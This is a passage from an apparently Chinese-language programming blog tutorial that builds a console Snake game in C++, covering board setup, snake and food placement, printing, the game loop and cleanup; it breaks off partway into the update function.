cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * @brief the generic method to place some char in the board</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @param b board</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @param p the character to be placed</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">place</span><span class=\"token punctuation\">(</span>board <span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> xPos_max <span class=\"token operator\">=</span> b<span class=\"token punctuation\">.</span>height <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> yPos_max <span class=\"token operator\">=</span> b<span class=\"token punctuation\">.</span>width <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span>xPos_max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">int</span> y <span class=\"token operator\">=</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span>yPos_max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">' '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">place</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"辅助函数-3place_food-place_snake\"><a class=\"markdownIt-Anchor\" href=\"#辅助函数-3place_food-place_snake\">#</a> 辅助函数 3： <code>place_food</code>  &amp;  <code>place_snake</code></h3>\n<p>在 <code>place_food</code>  中，我们直接调用 <code>place</code>  函数，将传入的 <code>char</code>  设定为 <code>$</code> ；而在 <code>place_snake</code>  中，除了需要放置食物外，还需要将 <code>place</code>  函数返回的坐标压到 <code>deque</code>  中，并且初始化方向。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * @brief initialize the snake in the board</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @param b the game board</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">place_snake</span><span class=\"token punctuation\">(</span>board <span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">></span> snake_pos <span class=\"token operator\">=</span> <span class=\"token function\">place</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> <span class=\"token char\">'S'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>snake_pos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>direction <span class=\"token operator\">=</span> RIGHT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"辅助函数-4print_board\"><a class=\"markdownIt-Anchor\" href=\"#辅助函数-4print_board\">#</a> 辅助函数 4： <code>print_board</code></h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * @brief print the board of the game</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @param b the game board</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">print_board</span><span class=\"token punctuation\">(</span>board <span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> head_x <span class=\"token operator\">=</span> b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> head_y <span class=\"token operator\">=</span> b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>height<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>width<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> head_x <span class=\"token operator\">&amp;&amp;</span> j <span class=\"token operator\">==</span> head_y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\033[0;31m\"</span> <span class=\"token operator\">&lt;&lt;</span> b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\033[0m\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"初始化board\"><a class=\"markdownIt-Anchor\" href=\"#初始化board\">#</a> 初始化 <code>board</code></h3>\n<p>该步骤遵循前文初始化步骤。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * @brief Initialize the board</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @param b the board struct</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @param width the width of the board</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @param height the height of the board</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">init_board</span><span class=\"token punctuation\">(</span>board <span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> width<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> height<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// init the width and height</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    b<span class=\"token punctuation\">.</span>width <span class=\"token operator\">=</span> width<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    b<span class=\"token punctuation\">.</span>height <span class=\"token operator\">=</span> height<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// init the board string and fill it with ` `</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    b<span class=\"token punctuation\">.</span>arr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">[</span>height<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> height<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span>width<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>width <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token char\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// init the wall around the board</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>width <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'#'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> height <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'#'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>width <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'#'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>height <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>height <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>width <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'#'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">// calculate the scope of xPos and yPos</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">int</span> xPos_max <span class=\"token operator\">=</span> height <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">int</span> yPos_max <span class=\"token operator\">=</span> width <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\">// init the wall in inside the board</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">int</span> wall_num <span class=\"token operator\">=</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span>height <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> width <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> wall_num<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span>xPos_max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">int</span> y <span class=\"token operator\">=</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span>yPos_max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'#'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\">// init the food</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token function\">place_food</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token comment\">// init the snake</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token function\">place_snake</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"游戏逻辑实现\"><a class=\"markdownIt-Anchor\" href=\"#游戏逻辑实现\">#</a> 游戏逻辑实现</h1>\n<blockquote>\n<ol>\n<li>提示用户输入游戏场地规格：长，宽 / 默认（不输入）, 如果长或宽小于 3, 则提示用户重新输入</li>\n<li>提示用户输入姓名</li>\n<li>初始化游戏场地</li>\n<li>初始化游戏分数和状态</li>\n<li>初始化默认开始方向</li>\n<li><code>while</code>  游戏没有结束:</li>\n<li>获取用户方向输入</li>\n<li>如果没有输入方向，则按照上次的方向继续</li>\n<li>根据用户输入方向更新游戏状态</li>\n<li>通知用户游戏结束，打印其姓名和分数，清理程序中所有的值</li>\n</ol>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// the game loop</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>g<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">_kbhit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token function\">_getch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">int</span> key <span class=\"token operator\">=</span> <span class=\"token function\">_getch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>direction <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">static_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>INPUT_KEY<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">update</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">print_board</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"游戏结束\"><a class=\"markdownIt-Anchor\" href=\"#游戏结束\">#</a> 游戏结束</h1>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// end the game</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Game Over!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Your Score is: \"</span> <span class=\"token operator\">&lt;&lt;</span> g<span class=\"token punctuation\">.</span>score <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">// clear the game state</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">delete</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>height<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token keyword\">delete</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">delete</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">.</span>arr<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"update函数更新游戏状态\"><a class=\"markdownIt-Anchor\" href=\"#update函数更新游戏状态\">#</a>  <code>update</code>  函数更新游戏状态</h1>\n<h2 id=\"步骤\"><a class=\"markdownIt-Anchor\" href=\"#步骤\">#</a> 步骤</h2>\n<pre><code>1. 根据蛇头，计算下一个位置的坐标\n2. 如果场地中下个位置的值是`S`，判断其是否为蛇尾，如果不是蛇尾或者是墙，游戏结束\n3. 如果下个位置是`$`，则(不去掉蛇尾):\n   1. 游戏分数+1\n4. 否则：\n   1. 将场地蛇尾处`S`修改为' '\n5. 将下一个位置加载蛇头\n6. 将蛇头处' '修改为`S`\n</code></pre>\n<h2 id=\"update函数\"><a class=\"markdownIt-Anchor\" href=\"#update函数\">#</a>  <code>update</code>  函数</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">update</span><span class=\"token punctuation\">(</span>game <span class=\"token operator\">&amp;</span>g<span class=\"token punctuation\">,</span> board <span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// get the current snake head</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">></span> head <span class=\"token operator\">=</span> b<span class=\"token punctuation\">.</span>s<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> head<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> y <span class=\"token operator\">=</span> head<span class=\"token punctuation\">.</span>second<span class=\"token 